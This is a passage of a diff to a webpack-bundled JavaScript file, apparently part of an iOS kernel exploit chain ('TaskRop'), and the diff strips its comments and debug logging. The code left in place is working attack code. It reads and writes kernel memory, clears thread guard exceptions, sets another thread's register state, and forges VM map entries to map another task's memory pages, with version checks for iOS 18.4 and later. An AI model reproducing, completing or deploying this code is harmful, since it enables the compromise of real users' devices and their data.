-/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( Thread)
+ });
+ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( "./src/libs/Chain/Chain.js");
+ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( "./src/libs/JSUtils/Utils.js");
+ var _ThreadState__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__( "./src/libs/TaskRop/ThreadState.js");
+ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__( "./src/libs/Chain/Native.js");
 
 
 
@@ -7169,10 +6871,10 @@ class Thread
 	static getTro(thread)
 	{
 		let tro = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().tro);
-		// Ignore threads with invalid tro address.
+		
 		if (!(tro & 0xf000000000000000n))
 		{
-			//console.log(TAG,`Got invalid tro of thread:${Utils.hex(thread)} and value:${Utils.hex(tro)}`);
+			
 			return 0n;
 		}
 		return tro;
@@ -7185,7 +6887,7 @@ class Thread
 	static getTask(thread)
 	{
 		let tro = this.getTro(thread);
-		// Ignore threads with invalid tro address.
+		
 		if (!(tro & 0xf000000000000000n) || tro === 0n)
 			return 0n;
 		let task = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(tro + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().troTask);
@@ -7222,7 +6924,7 @@ class Thread
 			return false;
 		}
 
-		// 18.4+
+		
 		if (xnuVersion.major == 24 && xnuVersion.minor >= 4) {
 			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, 0x17n);
 			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode + 0x8n, code);
@@ -7246,7 +6948,7 @@ class Thread
 		ast &= ~AST_GUARD | 0x80000000;
 		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast, ast);
 
-		// 18.4+
+		
 		if (xnuVersion.major == 24 && xnuVersion.minor >= 4) {
 			if (libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode) == 0x17n) {
 				libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, 0n);
@@ -7313,7 +7015,7 @@ class Thread
 
 		let statePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem;
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].write(statePtr, state.buffer);
-		//console.log(TAG,`thread:${Utils.hex(thread)}`);
+		
 		let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].callSymbol("thread_set_state",
 			machThread,
 			libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64,
@@ -7344,19 +7046,17 @@ class Thread
 }
 
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/ThreadState.js":
-/*!*****************************************!*\
-  !*** ./src/libs/TaskRop/ThreadState.js ***!
-  \*****************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/ThreadState.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ ThreadState)
-/* harmony export */ });
-/* harmony import */ var _RegistersStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./RegistersStruct */ "./src/libs/TaskRop/RegistersStruct.js");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( ThreadState)
+ });
+ var _RegistersStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( "./src/libs/TaskRop/RegistersStruct.js");
 
 
 class ThreadState
@@ -7423,26 +7123,24 @@ class ThreadState
 	}
 }
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/VM.js":
-/*!********************************!*\
-  !*** ./src/libs/TaskRop/VM.js ***!
-  \********************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/VM.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ VM)
-/* harmony export */ });
-/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
-/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
-/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
-/* harmony import */ var _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./VmMapEntry */ "./src/libs/TaskRop/VmMapEntry.js");
-/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");
-/* harmony import */ var _VMObject__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ./VMObject */ "./src/libs/TaskRop/VMObject.js");
-/* harmony import */ var _VMShmem__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./VMShmem */ "./src/libs/TaskRop/VMShmem.js");
-/* harmony import */ var _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! ./VmPackingParams */ "./src/libs/TaskRop/VmPackingParams.js");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( VM)
+ });
+ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( "./src/libs/Chain/Chain.js");
+ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( "./src/libs/Chain/Native.js");
+ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__( "./src/libs/JSUtils/Utils.js");
+ var _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__( "./src/libs/TaskRop/VmMapEntry.js");
+ var _Task__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__( "./src/libs/TaskRop/Task.js");
+ var _VMObject__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__( "./src/libs/TaskRop/VMObject.js");
+ var _VMShmem__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__( "./src/libs/TaskRop/VMShmem.js");
+ var _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__( "./src/libs/TaskRop/VmPackingParams.js");
 
 
 
@@ -7516,18 +7214,18 @@ class VM
 		return this.#vm_pack_pointer(ptr, this.#VM_PACKING_PARAMS(ns));
 	}
 	static #bigUint64ToIntptr(bigUint64) {
-		// Create a BigInt mask for the lower 64 bits
+		
 		const lower64BitsMask = BigInt("0xFFFFFFFFFFFFFFFF");
 
-		// Apply the mask to ensure the value is within the range of 64 bits
+		
 		bigUint64 = bigUint64 & lower64BitsMask;
 
-		// Check if the value is greater than the maximum signed 64-bit integer
+		
 		if (bigUint64 > BigInt("0x7FFFFFFFFFFFFFFF")) {
-			// Convert to signed by subtracting 2^64
+			
 			return Number(bigUint64 - BigInt("0x10000000000000000"));
 		} else {
-			// Directly convert to Number
+			
 			return Number(bigUint64);
 		}
 	}
@@ -7535,8 +7233,8 @@ class VM
 	{
 		if (!params.vmpp_base_relative)
 		{
-			//console.log(TAG,`In first if unpack`);
-			//let addr = this.#bigUint64ToIntptr(BigInt(packed));
+			
+			
 			let addr = packed;
 			addr <<= 64 - params.vmpp_bits;
 			addr >>= 64 - params.vmpp_bits - params.vmpp_shift;
@@ -7544,7 +7242,7 @@ class VM
 		}
 		if (packed)
 		{
-			//console.log(TAG,`In second if unpack`);
+			
 			return (BigInt(packed) << BigInt(params.vmpp_shift)) + BigInt(params.vmpp_base);
 		}
 		return 0n;
@@ -7553,12 +7251,12 @@ class VM
 	{
 		if (!params.vmpp_base_relative)
 		{
-			//console.log(TAG,`In first if pack`);
+			
 			return ptr >> params.vmpp_shift;
 		}
 		if (ptr)
 		{
-			//console.log(TAG,`In second if pack`);
+			
 			return (BigInt(ptr) - BigInt(params.vmpp_base)) >> BigInt(params.vmpp_shift);
 		}
 		return 0n;
@@ -7569,28 +7267,28 @@ class VM
 	}
 	static #trunc_page_kernel(x)
 	{
-		//return ((x) & (~vm_kernel_page_mask));
+		
 		return ((x) & (~libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].PAGE_MASK));
 	}
 	static #round_page_kernel(x)
 	{
-		//return this.#trunc_page_kernel((x) + vm_kernel_page_mask);
+		
 		return this.#trunc_page_kernel((x) + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].PAGE_MASK);
 	}
 	static #vm_getEntry(map,address)
 	{
 		let rbhRoot = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(map + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().hdrRBHRoot);
 		
-		//console.log(TAG,`Get entry:${Utils.hex(address)}`);
-		//console.log(TAG,`rbh root:${Utils.hex(rbhRoot)}`);
+		
+		
 	
 		let rbEntry = rbhRoot;
 		let foundEntry = 0n;
 	
 		while (rbEntry != 0n)
 		{
-			let curPtr = rbEntry - 0x20n; // container_of(rb_entry, struct vm_map_entry, store)
-			//uint64_t prev = 0;
+			let curPtr = rbEntry - 0x20n; 
+			
 	
 			let links = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
 			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read(curPtr, links, VM_LINK_SIZE);
@@ -7598,20 +7296,20 @@ class VM
 			let linksArray = new Uint8Array(linksBuffer);
 			links = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__.vm_map_links(linksArray);
 	
-			//console.log(TAG,`[${Utils.hex(links.start)} - ${Utils.hex(links.end)}]:${Utils.hex(curPtr)}`);
+			
 	
 			if (address >= links.start)
 			{
 				if (address < links.end)
 				{
 					foundEntry = curPtr;
-					//console.log(TAG,`Found:${Utils.hex(curPtr)}`);
+					
 					break;
 				}
 	
 				let rbeRight = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(rbEntry +  libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().rbeRight);
 				rbEntry = rbeRight;
-				//prev = curPtr;
+				
 			}
 			else
 			{
@@ -7624,19 +7322,19 @@ class VM
 
 	static mapRemotePage(vmMap, address)
 	{
-		//console.log(TAG, `Map remote address: ${Utils.hex(address)}`);
+		
 
 		let vmObject = VM.getObject(vmMap, address);
-		//LOG("vmObject: %llx (objectOffset=%llx, entryOffset=%llx)",
-		//	vmObject.address,
-		//	vmObject.objectOffset,
-		//	vmObject.entryOffset);
+		
+		
+		
+		
 		
 		if (!vmObject.address)
 			return null;
 
 		let shmem = VM.createShmemWithVmObject(vmObject);
-		//LOG("shmem: port=%x, address=%llx", shmem.port, shmem.remoteAddress);
+		
 
 		return shmem;
 	}
@@ -7652,7 +7350,7 @@ class VM
 		let entryBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].readBuff(entryAddr, VM_MAP_ENTRY_SIZE);
 		let entryUintArr = new Uint8Array(entryBuff);
 		let entry = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__.vm_map_entry(entryUintArr);
-		//console.log(TAG, `entry: addr=${Utils.hex(entryAddr)}, is_sub_map=${entry.is_sub_map}, vme_object_packed=${Utils.hex(entry.vme_object)}`);
+		
 
 		let paramsBuff = new ArrayBuffer(VMPackingSize);
 		let params = new _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__["default"](paramsBuff);
@@ -7661,13 +7359,13 @@ class VM
 		params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
 		params.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(params);
 		let vmeObject = this.#VM_UNPACK_POINTER(entry.vme_object, params);
-		//console.log(TAG, `vme object: ${Utils.hex(vmeObject)}`);
+		
 
 		let objectOffs = this.#VME_OFFSET(entry);
 		let entryOffs = address - entry.links.start + objectOffs;
 		
-		//console.log(TAG, `object offset: ${Utils.hex(objectOffs)}`);
-		//console.log(TAG, `entry offset: ${Utils.hex(entryOffs)}`);
+		
+		
 
 		vmObject.vmAddress = address;
 		vmObject.address = BigInt(vmeObject);
@@ -7678,13 +7376,13 @@ class VM
 
 	static createShmemWithVmObject(object)
 	{
-		//console.log(TAG,`Inside createShmem with addr to read:${Utils.hex(object.address)}`);
+		
 		let shmemBuff = new ArrayBuffer(VMShmem_SIZE);
 		let shmem = new _VMShmem__WEBPACK_IMPORTED_MODULE_6__["default"](shmemBuff);
 		let size = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().vouSize);
 		size = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].round_page(size);
 		
-		//console.log(TAG,`vm object size:${Utils.hex(size)}`);
+		
 		
 		let localAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
 		let roundedSize = this.#round_page_kernel(size);
@@ -7695,20 +7393,8 @@ class VM
 			return shmem;
 		}
 		localAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(localAddr);
-		//console.log(TAG,`mach_vm_allocate:${Utils.hex(roundedSize)} localAddr:${Utils.hex(localAddr)}`);
-		/*
-		let memory_object = new_bigint();
-		ret = Native.callSymbol("mach_make_memory_entry_64",
-			0x203n,
-			get_bigint_addr(roundedSize),
-			localAddr,
-			this.VM_PROT_READ | this.VM_PROT_WRITE,
-			get_bigint_addr(memory_object),
-			0n);
-		let resBuff = Native.read(get_bigint_addr(memory_object),Utils.UINT32_SIZE);
-		let resView = new DataView(resBuff);
-		let port = resView.getUint32(0,true);
-		*/
+		
+		
 		
 		let memory_object = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x500n;
 		let roundedSizePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x1000n;
@@ -7722,20 +7408,20 @@ class VM
 			memory_object,
 			0n);
 		let port = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read32(memory_object);
-		//let port = Native.callSymbol("wrapper_mach_make_memory_entry_64",roundedSize,localAddr);
-		//console.log(TAG,`mach_make_memory_entry_64():${Utils.hex(port)}`);
+		
+		
 		let shmemNamedEntry = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getPortKObject(BigInt(port));
-		//console.log(TAG,`shmem named entry:${Utils.hex(shmemNamedEntry)}`);
+		
 		let shmemVMCopyAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(shmemNamedEntry + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().backingCopy);
-		//console.log(TAG,`shmem named entry VM copy addr:${Utils.hex(shmemVMCopyAddr)}`);
+		
 		let nextAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(shmemVMCopyAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().next);
-		//console.log(TAG,`next addr:${Utils.hex(nextAddr)}`);
+		
 		let entryBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].readBuff(nextAddr, VM_MAP_ENTRY_SIZE);
 		let entryArr = new Uint8Array(entryBuff);
 		let entry = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__.vm_map_entry(entryArr);
-		//console.log(TAG,`entry: vme_kernel_object=${Utils.hex(entry.vme_kernel_object)}, is_sub_map=${Utils.hex(entry.is_sub_map)}`);
-		//console.log(TAG,`entry: is_sub_map=${Utils.hex(entry.is_sub_map)}`);
-		if (entry.vme_kernel_object || entry.is_sub_map || false) // vme_kernel_object struct is not implemented
+		
+		
+		if (entry.vme_kernel_object || entry.is_sub_map || false) 
 		{
 			console.log(TAG,`Entry cannot be a submap`);
 			return shmem;
@@ -7747,31 +7433,31 @@ class VM
 		params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
 		params.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(params);
 		let packedPointer = this.#VM_PACK_POINTER(object.address, params);
-		//console.log(TAG,`packedPointer:${Utils.hex(packedPointer)}`);
+		
 		let refCount = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().refCount);
-		//console.log(TAG,`vm object ref count:${Utils.hex(refCount)}`);
+		
 		refCount++;
 		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().refCount, refCount);
 		entry.vme_object = Number(packedPointer);
 		entry.vme_offset = object.objectOffset;
-		//write(nextAddr, &entry, sizeof(entry));
-		// write dedicate write in order to avoid zone panic with bigger 0x20 elements size
+		
+		
 		let entryResWrite = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(entryResWrite,entryArr.buffer);
-		//Utils.printArrayBufferInChunks(entryArr.buffer);
+		
 		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].writeZoneElement(nextAddr, entryResWrite, VM_MAP_ENTRY_SIZE);
-		//console.log(TAG,`After write zone element`);
-		//let mappedAddr = Native.callSymbol("malloc",roundedSize * 4n);
-		//let mappedAddr = new_bigint();
+		
+		
+		
 		let mappedAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write64(mappedAddr, 0x1337n);
-		//let mach_vm_map_func = Native.dlsym("mach_vm_map");
-		//console.log(TAG,`mach_vm_map:${Utils.hex(mach_vm_map_func)} with object.entryOffset:${Utils.hex(object.entryOffset)}`);
-		//ret = fcall(mach_vm_map_func,0x203n,get_bigint_addr(mappedAddr),0x4000n,0n,1n,BigInt(port),BigInt(object.entryOffset),0n,(this.VM_PROT_ALL | this.VM_PROT_IS_MASK) | ((this.VM_PROT_ALL | this.VM_PROT_IS_MASK) << 32n),this.VM_INHERIT_NONE);
+		
+		
+		
 		ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_vm_map",0x203n,mappedAddr,0x4000n,0n,1n,BigInt(port),BigInt(object.entryOffset),0n,(this.VM_PROT_ALL | this.VM_PROT_IS_MASK) | ((this.VM_PROT_ALL | this.VM_PROT_IS_MASK) << 32n),this.VM_INHERIT_NONE);
-		//console.log(TAG,`ret:${ret}`);
+		
 		mappedAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(mappedAddr);
-		//console.log(TAG,`mach_vm_map():${Utils.hex(ret)}, mappedAddr=${Utils.hex(mappedAddr)}`);
+		
 		if(ret != 0)
 		{
 			console.log(TAG,'failed on mach_vm_map');
@@ -7783,8 +7469,8 @@ class VM
 			console.log(TAG, "mach_vm_deallocate: " + ret);
 		}
 
-		//let mappedAddr = Native.callSymbol("wrapper_mach_vm_map",port,object.entryOffset);
-		//console.log(TAG,`mappedAddr:${Utils.hex(mappedAddr)}`);
+		
+		
 		shmem.port = BigInt(port);
 		shmem.remoteAddress = object.vmAddress;
 		shmem.localAddress = mappedAddr;
@@ -7800,25 +7486,23 @@ class VM
 		params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
 		params.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(params);
 		let vmeObject = this.#VM_UNPACK_POINTER(addrUnpack, params);
-		//console.log(TAG,`vmeObjectUnpack:${Utils.hex(vmeObject)}`);
+		
 		vmeObject = this.#VM_PACK_POINTER(addrPack,params);
-		//console.log(TAG,`vmeObjectpack:${Utils.hex(vmeObject)}`);
+		
 	}
 }
 
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/VMObject.js":
-/*!**************************************!*\
-  !*** ./src/libs/TaskRop/VMObject.js ***!
-  \**************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/VMObject.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ VMObject)
-/* harmony export */ });
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( VMObject)
+ });
 class VMObject
 {
 	#buffer;
@@ -7862,18 +7546,16 @@ class VMObject
 	}
 }
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/VMShmem.js":
-/*!*************************************!*\
-  !*** ./src/libs/TaskRop/VMShmem.js ***!
-  \*************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/VMShmem.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ VMShmem)
-/* harmony export */ });
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( VMShmem)
+ });
 class VMShmem 
 {
 	#buffer;
@@ -7909,20 +7591,18 @@ class VMShmem
 	}
 }
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/VmMapEntry.js":
-/*!****************************************!*\
-  !*** ./src/libs/TaskRop/VmMapEntry.js ***!
-  \****************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/VmMapEntry.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__),
-/* harmony export */   vm_map_entry: () => (/* binding */ vm_map_entry),
-/* harmony export */   vm_map_links: () => (/* binding */ vm_map_links)
-/* harmony export */ });
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => (__WEBPACK_DEFAULT_EXPORT__),
+   vm_map_entry: () => ( vm_map_entry),
+   vm_map_links: () => ( vm_map_links)
+ });
 class vm_map_links {
     #__mem;
     #__view;
@@ -7935,16 +7615,16 @@ class vm_map_links {
         this.sizeof = this.#__mem.length;
     }
     get addr() { if (!this.#__addr) { this.#__addr = get_buffer_addr(this.#__mem).add(this.#__off); } return this.#__addr; }
-    /* previous entry */
+    
     get prev() { return this.#__view.getBigUint64(this.#__off, true); }
     set prev(val) { this.#__view.setBigUint64(this.#__off, val, true); }
-    /* next entry */
+    
     get next() { return this.#__view.getBigUint64(this.#__off+0x8, true); }
     set next(val) { this.#__view.setBigUint64(this.#__off+0x8, val, true); }
-    /* start address */
+    
     get start() { return this.#__view.getBigUint64(this.#__off+0x10, true); }
     set start(val) { this.#__view.setBigUint64(this.#__off+0x10, val, true); }
-    /* end address */
+    
     get end() { return this.#__view.getBigUint64(this.#__off+0x18, true); }
     set end(val) { this.#__view.setBigUint64(this.#__off+0x18, val, true); }
 };
@@ -7961,13 +7641,13 @@ class vm_map_store {
         this.sizeof = this.#__mem.length;
     }
     get addr() { if (!this.#__addr) { this.#__addr = get_buffer_addr(this.#__mem).add(this.#__off); } return this.#__addr; }
-    /* left element */
+    
     get rbe_left() { return this.#__view.getBigUint64(this.#__off, true); }
     set rbe_left(val) { this.#__view.setBigUint64(this.#__off, val, true); }
-    /* right element */
+    
     get rbe_right() { return this.#__view.getBigUint64(this.#__off+0x8, true); }
     set rbe_right(val) { this.#__view.setBigUint64(this.#__off+0x8, val, true); }
-    /* parent element */
+    
     get rbe_parent() { return this.#__view.getBigUint64(this.#__off+0x10, true); }
     set rbe_parent(val) { this.#__view.setBigUint64(this.#__off+0x10, val, true); }
 };
@@ -7987,11 +7667,11 @@ class vm_map_entry {
     }
     get addr() { if (!this.#__addr) { this.#__addr = get_buffer_addr(this.#__mem).add(this.#__off); } return this.#__addr; }
 
-    // Union field 1
+    
     get vme_object_value() { return this.#__view.getBigUint64(this.#__off+0x38, true); }
     set vme_object_value(val) { this.#__view.setBigUint64(this.#__off+0x38, val, true); }
 
-    // Union field 2
+    
     get vme_atomic() { return this.#__view.getUint8(this.#__off+0x38, true) & 1; }
     set vme_atomic(val) {
         let cur = this.#__view.getUint8(this.#__off+0x38, true) & 0xfe;
@@ -8008,7 +7688,7 @@ class vm_map_entry {
         this.#__view.setBigUint64(this.#__off+0x38, cur + ((val & 0x3fffffffffffffffn) << 2n), true);
     }
 
-    // Union field 3
+    
     get vme_ctx_atomic() { return this.#__view.getUint8(this.#__off+0x38, true) & 1; }
     set vme_ctx_atomic(val) {
         let cur = this.#__view.getUint8(this.#__off+0x38, true) & 0xfe;
@@ -8027,61 +7707,59 @@ class vm_map_entry {
     get vme_object() { return this.#__view.getUint32(this.#__off+0x3c, true); }
     set vme_object(val) { this.#__view.setUint32(this.#__off+0x3c, val, true); }
 
-    // vme_alias:12,               /* entry VM tag */
-    // vme_offset:52,              /* offset into object */
+    
+    
     get vme_offset() { return this.#__view.getBigUint64(this.#__off+0x40, true) >> 12n;  }
     set vme_offset(val) {
         let cur = this.#__view.getBigUint64(this.#__off+0x40, true) & 0xfffn;
         this.#__view.setBigUint64(this.#__off+0x40, cur + (val << 12n), true);
     }
-    // is_shared:1,                /* region is shared */
-    // __unused1:1,
-    // in_transition:1,            /* Entry being changed */
-    // needs_wakeup:1,             /* Waiters on in_transition */
-    // behavior:2,                 /* user paging behavior hint */
-    // needs_copy:1,               /* object need to be copied? */
-    // protection:3,               /* protection code */
-    // used_for_tpro:1,
-    // max_protection:4,           /* maximum protection, bit3=UEXEC */
-    // inheritance:2,              /* inheritance */
-    // use_pmap:1,
-    // no_cache:1,                 /* should new pages be cached? */
-    // vme_permanent:1,            /* mapping can not be removed */
-    // superpage_size:1,           /* use superpages of a certain size */
-    // map_aligned:1,              /* align to map's page size */
-    // zero_wired_pages:1,
-    // used_for_jit:1,
-    // csm_associated:1,           /* code signing monitor will validate */
-    // iokit_acct:1,
-    // vme_resilient_codesign:1,
-    // vme_resilient_media:1,
-    // vme_xnu_user_debug:1,
-    // vme_no_copy_on_read:1,
-    // translated_allow_execute:1, /* execute in translated processes */
-    // vme_kernel_object:1;        /* vme_object is kernel_object */
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
 
-    /* can be paged if = 0 */
+    
     get wired_count() { return this.#__view.getUint16(this.#__off+0x4c, true); }
     set wired_count(val) { this.#__view.setUint16(this.#__off+0x4c, val, true); }
-    /* for vm_wire */
+    
     get user_wired_count() { return this.#__view.getUint16(this.#__off+0x4e, true); }
     set user_wired_count(val) { this.#__view.setUint16(this.#__off+0x4e, val, true); }
 };
-/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ({vm_map_entry,vm_map_links,vm_map_store});
+ const __WEBPACK_DEFAULT_EXPORT__ = ({vm_map_entry,vm_map_links,vm_map_store});
 
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/VmPackingParams.js":
-/*!*********************************************!*\
-  !*** ./src/libs/TaskRop/VmPackingParams.js ***!
-  \*********************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/VmPackingParams.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ VmPackingParams)
-/* harmony export */ });
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( VmPackingParams)
+ });
 class VmPackingParams
 {
 	#buffer;
@@ -8125,85 +7803,82 @@ class VmPackingParams
 	}
 }
 
-/***/ })
+ })
 
-/******/ 	});
-/************************************************************************/
-/******/ 	// The module cache
-/******/ 	var __webpack_module_cache__ = {};
-/******/ 	
-/******/ 	// The require function
-/******/ 	function __webpack_require__(moduleId) {
-/******/ 		// Check if module is in cache
-/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
-/******/ 		if (cachedModule !== undefined) {
-/******/ 			return cachedModule.exports;
-/******/ 		}
-/******/ 		// Create a new module (and put it into the cache)
-/******/ 		var module = __webpack_module_cache__[moduleId] = {
-/******/ 			// no module.id needed
-/******/ 			// no module.loaded needed
